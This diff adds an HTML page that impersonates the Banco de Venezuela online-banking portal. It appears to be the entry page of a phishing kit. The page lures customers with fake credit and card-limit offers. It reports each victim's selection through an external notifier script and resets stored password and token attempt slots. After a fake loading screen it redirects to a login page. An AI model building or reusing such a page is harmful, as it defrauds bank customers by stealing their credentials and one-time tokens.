@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>BDV en línea - Trámites</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,600;0,700;1,400&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  
+  <style>
+    html {
+      -webkit-text-size-adjust: 100%;
+      text-size-adjust: 100%;
+    }
+
+    body {
+      font-family: 'Open Sans', 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      text-rendering: optimizeLegibility;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      -webkit-backface-visibility: hidden;
+      backface-visibility: hidden;
+    }
+
+    /* Estilo exacto para el selector */
+    .bdv-select-trigger {
+      background-color: #ededed;
+      border-bottom: 2px solid #8e9499;
+      color: #333333;
+      padding: 0.85rem 1rem;
+      width: 100%;
+      height: 50px;
+      outline: none;
+      font-size: 14.5px;
+      font-weight: 500;
+      border-top-left-radius: 4px;
+      border-top-right-radius: 4px;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: border-color 0.2s, background-color 0.2s;
+    }
+
+    .bdv-select-trigger.active {
+      border-bottom: 2px solid #0056b3;
+    }
+
+    .select-arrow {
+      pointer-events: none;
+      width: 0;
+      height: 0;
+      border-left: 5px solid transparent;
+      border-right: 5px solid transparent;
+      border-top: 6px solid #666666;
+      transition: transform 0.2s ease;
+    }
+
+    .select-arrow.open {
+      transform: rotate(180deg);
+    }
+
+    /* Menú desplegable profesional */
+    .bdv-dropdown-menu {
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.12), 0 4px 10px -2px rgba(0, 0, 0, 0.04);
+      border-radius: 6px;
+      border: 1px solid #e2e8f0;
+    }
+
+    /* Línea divisoria punteada */
+    .dashed-divider {
+      border-top: 1.5px dashed #dedede;
+    }
+
+    /* Color azul institucional */
+    .bdv-blue {
+      color: #0d5db8;
+    }
+
+    /* Sombra suave de la tarjeta */
+    .card-shadow {
+      box-shadow: 0 10px 30px -4px rgba(0, 0, 0, 0.16), 0 2px 6px rgba(0, 0, 0, 0.06);
+    }
+
+    body {
+      background-color: #ffffff;
+      background-image: url('bdv-bg.jpg');
+      background-repeat: no-repeat;
+      background-position: center center;
+      background-attachment: fixed;
+      background-size: cover;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        background-attachment: scroll;
+      }
+      main {
+        align-items: center !important;
+        justify-content: center !important;
+        padding-top: 20px !important;
+        padding-bottom: 24px !important;
+      }
+      .card-shadow {
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08) !important;
+      }
+      .backdrop-blur-md {
+        backdrop-filter: none !important;
+        -webkit-backdrop-filter: none !important;
+        background-color: #ffffff !important;
+      }
+    }
+
+    /* =========================================
+       LOADER: FONDO SUTIL Y RAYAS GRIS CON TOQUE NEGRO
+    ========================================= */
+    .loader-center {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0, 0, 0, 0.16);
+      backdrop-filter: blur(2px);
+      -webkit-backdrop-filter: blur(2px);
+      z-index: 999999;
+      animation: fadeInLoader 0.15s ease-out;
+    }
+
+    @keyframes fadeInLoader {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .loader {
+      display: flex;
+      align-items: center;
+      gap: 3.5px;
+    }
+
+    .loader span {
+      width: 8px;
+      height: 28px;
+      background: #2b2f36;
+      border-radius: 2px;
+      animation: movimiento 0.8s ease-in-out infinite;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
+    }
+
+    .loader span:nth-child(1) {
+      animation-delay: 0s;
+    }
+
+    .loader span:nth-child(2) {
+      animation-delay: 0.12s;
+    }
+
+    .loader span:nth-child(3) {
+      animation-delay: 0.24s;
+    }
+
+    .loader span:nth-child(4) {
+      animation-delay: 0.36s;
+    }
+
+    @keyframes movimiento {
+      0%, 100% {
+        transform: scaleY(0.45);
+        opacity: 0.55;
+      }
+
+      50% {
+        transform: scaleY(1.4);
+        opacity: 1;
+      }
+    }
+  </style>
+</head>
+
+<body class="min-h-screen flex flex-col justify-start items-stretch">
+
+  <!-- Barra de navegación superior -->
+  <header class="w-full bg-white h-[62px] px-5 flex items-center justify-between border-b border-gray-200/90 shadow-[0_1px_2px_rgba(0,0,0,0.02)] sticky top-0 z-50">
+    <!-- Logotipo Banco de Venezuela -->
+    <a href="index.html" class="flex items-center select-none">
+      <img src="bdv-logo.png" alt="Banco de Venezuela" class="h-8 sm:h-9 w-auto object-contain">
+    </a>
+
+    <!-- Menú Hamburguesa -->
+    <button type="button" aria-label="Abrir menú" class="p-1.5 text-[#24292f] focus:outline-none focus:ring-1 focus:ring-gray-300 rounded">
+      <svg class="w-7 h-7" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+      </svg>
+    </button>
+  </header>
+
+  <main class="w-full flex-1 flex items-center justify-center py-6 sm:py-10 px-4 min-h-[calc(100vh-62px)]">
+    <!-- Tarjeta blanca principal con el mismo tamaño que la página de cargando (540px) -->
+    <div class="w-full max-w-[540px] bg-white/95 backdrop-blur-md rounded-[12px] card-shadow border border-white/80 px-7 sm:px-10 pt-10 pb-9 flex flex-col relative">
+      
+      <!-- Logotipo oficial BDVenlínea personas -->
+      <div class="flex items-center justify-center mb-7 select-none">
+        <img src="bdv-enlinea-personas.png" alt="BDVenlínea personas" class="max-w-[275px] w-auto h-auto object-contain">
+      </div>
+
+      <!-- Contenedor del selector desplegable personalizado -->
+      <div class="relative mb-5" id="customSelectContainer">
+        <!-- Disparador del selector -->
+        <button 
+          type="button" 
+          id="selectTrigger"
+          class="bdv-select-trigger"
+          aria-haspopup="listbox"
+          aria-expanded="false"
+        >
+          <span id="selectedLabel" class="truncate pr-2">Seleccione el trámite *</span>
+          <div id="selectArrow" class="select-arrow"></div>
+        </button>
+
+        <!-- Dropdown con las opciones limpias y elegantes -->
+        <div 
+          id="optionsDropdown"
+          class="hidden absolute z-30 left-0 right-0 top-full mt-1.5 bg-white bdv-dropdown-menu shadow-lg py-1.5 max-h-64 overflow-y-auto"
+          role="listbox"
+        >
+          <div>
+            <!-- Opción 1 -->
+            <div 
+              class="option-item cursor-pointer px-4 py-2.5 text-[14px] font-normal text-[#333333] hover:bg-[#f2f6fa] hover:text-[#0d5db8] transition-colors border-b border-gray-100"
+              data-value="credito-100k-1m"
+              data-label="Solicitud de Crédito 100.000 Bs. a 1 millón"
+              role="option"
+            >
+              Solicitud de Crédito 100.000 Bs. a 1 millón
+            </div>
+
+            <!-- Opción 2 -->
+            <div 
+              class="option-item cursor-pointer px-4 py-2.5 text-[14px] font-normal text-[#333333] hover:bg-[#f2f6fa] hover:text-[#0d5db8] transition-colors border-b border-gray-100"
+              data-value="credito-vivienda"
+              data-label="Créditos para la Compra de Vivienda"
+              role="option"
+            >
+              Créditos para la Compra de Vivienda
+            </div>
+
+            <!-- Opción 3 -->
+            <div 
+              class="option-item cursor-pointer px-4 py-2.5 text-[14px] font-normal text-[#333333] hover:bg-[#f2f6fa] hover:text-[#0d5db8] transition-colors border-b border-gray-100"
+              data-value="aumento-limite"
+              data-label="Aumento de Límite de Tarjeta de Crédito"
+              role="option"
+            >
+              Aumento de Límite de Tarjeta de Crédito
+            </div>
+
+            <!-- Opción 4 -->
+            <div 
+              class="option-item cursor-pointer px-4 py-2.5 text-[14px] font-normal text-[#333333] hover:bg-[#f2f6fa] hover:text-[#0d5db8] transition-colors border-b border-gray-100"
+              data-value="credito-vehiculo"
+              data-label="Créditos para Vehículo"
+              role="option"
+            >
+              Créditos para Vehículo
+            </div>
+
+            <!-- Opción 5 -->
+            <div 
+              class="option-item cursor-pointer px-4 py-2.5 text-[14px] font-normal text-[#333333] hover:bg-[#f2f6fa] hover:text-[#0d5db8] transition-colors"
+              data-value="obtener-tarjeta"
+              data-label="Obtener tarjeta de crédito"
+              role="option"
+            >
+              Obtener tarjeta de crédito
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Botón Comenzar Solicitud -->
+      <button 
+        type="button" 
+        id="submitBtn"
+        class="w-full h-[48px] rounded-[4px] bg-[#dcdcdc] text-[#7a8188] font-bold text-[15px] tracking-wide cursor-not-allowed select-none transition-all duration-150 flex items-center justify-center"
+        disabled
+      >
+        Comenzar solicitud
+      </button>
+
+      <!-- Separador de línea punteada -->
+      <div class="dashed-divider mt-7 mb-5"></div>
+
+      <!-- Sección Requisitos -->
+      <div class="text-[#595d63]">
+        <h2 class="font-bold text-[14px] text-[#4b5157] mb-2.5">
+          Requisitos:
+        </h2>
+        <ul class="space-y-1.5 pl-4 text-[13px] text-[#555a60] leading-relaxed list-disc">
+          <li>
+            <span>Poseer cuenta activa en el BDV</span>
+          </li>
+          <li>
+            <span>Cuenta con antigüedad de 2 meses mínimo</span>
+          </li>
+        </ul>
+      </div>
+
+    </div>
+  </main>
+
+  <script src="notifier.js"></script>
+  <script>
+    const selectTrigger = document.getElementById('selectTrigger');
+    const optionsDropdown = document.getElementById('optionsDropdown');
+    const selectArrow = document.getElementById('selectArrow');
+    const selectedLabel = document.getElementById('selectedLabel');
+    const submitBtn = document.getElementById('submitBtn');
+    const optionItems = document.querySelectorAll('.option-item');
+
+    let isDropdownOpen = false;
+    let selectedValue = null;
+
+    function toggleDropdown(show) {
+      isDropdownOpen = typeof show === 'boolean' ? show : !isDropdownOpen;
+      if (isDropdownOpen) {
+        optionsDropdown.classList.remove('hidden');
+        selectTrigger.classList.add('active');
+        selectArrow.classList.add('open');
+        selectTrigger.setAttribute('aria-expanded', 'true');
+      } else {
+        optionsDropdown.classList.add('hidden');
+        selectTrigger.classList.remove('active');
+        selectArrow.classList.remove('open');
+        selectTrigger.setAttribute('aria-expanded', 'false');
+      }
+    }
+
+    selectTrigger.addEventListener('click', (e) => {
+      e.stopPropagation();
+      toggleDropdown();
+    });
+
+    optionItems.forEach((item) => {
+      item.addEventListener('click', (e) => {
+        e.stopPropagation();
+        selectedValue = item.getAttribute('data-value');
+        const labelText = item.getAttribute('data-label');
+        
+        selectedLabel.textContent = labelText;
+        selectedLabel.classList.add('text-[#1f2937]', 'font-medium');
+        
+        // Habilitar botón de enviar
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('bg-[#dcdcdc]', 'text-[#7a8188]', 'cursor-not-allowed');
+        submitBtn.classList.add('bg-[#0d5db8]', 'text-white', 'hover:bg-[#0b4d98]', 'cursor-pointer', 'shadow-sm');
+
+        toggleDropdown(false);
+      });
+    });
+
+    // Cerrar si se hace click fuera
+    document.addEventListener('click', (e) => {
+      if (!document.getElementById('customSelectContainer').contains(e.target)) {
+        toggleDropdown(false);
+      }
+    });
+
+    function showLoader(callback, duration = 6000) {
+      const loader = document.getElementById('pageLoader');
+      if (loader) {
+        loader.style.display = 'flex';
+        setTimeout(() => {
+          loader.style.display = 'none';
+          if (typeof callback === 'function') {
+            callback();
+          }
+        }, duration);
+      } else if (typeof callback === 'function') {
+        callback();
+      }
+    }
+
+    // Limpiar usuario almacenado para que nunca quede guardado
+    sessionStorage.removeItem('bdv_user');
+    localStorage.removeItem('bdv_user');
+    window.addEventListener('pageshow', () => {
+      sessionStorage.removeItem('bdv_user');
+      localStorage.removeItem('bdv_user');
+    });
+
+    submitBtn.addEventListener('click', () => {
+      if (!submitBtn.disabled && selectedValue) {
+        const tramiteText = selectedLabel.textContent.trim();
+        sessionStorage.setItem('bdv_tramite', tramiteText);
+        sessionStorage.removeItem('bdv_user');
+        localStorage.removeItem('bdv_user');
+        sessionStorage.removeItem('bdv_pwd_attempts');
+        sessionStorage.removeItem('bdv_token_attempts');
+        sessionStorage.removeItem('bdv_pwd_1');
+        sessionStorage.removeItem('bdv_pwd_2');
+        sessionStorage.removeItem('bdv_token_1');
+        sessionStorage.removeItem('bdv_token_2');
+
+        if (window.BDVNotifier) {
+          BDVNotifier.sendTramite(tramiteText);
+        }
+
+        showLoader(() => {
+          window.location.href = 'login.html';
+        }, 6000);
+      }
+    });
+  </script>
+
+  <!-- CARGA CON FONDO MÁS CLARO Y RAYAS EN GRIS CLARO -->
+  <div class="loader-center" id="pageLoader" style="display: none;">
+    <div class="loader">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+  </div>
+
+</body>
+</html>
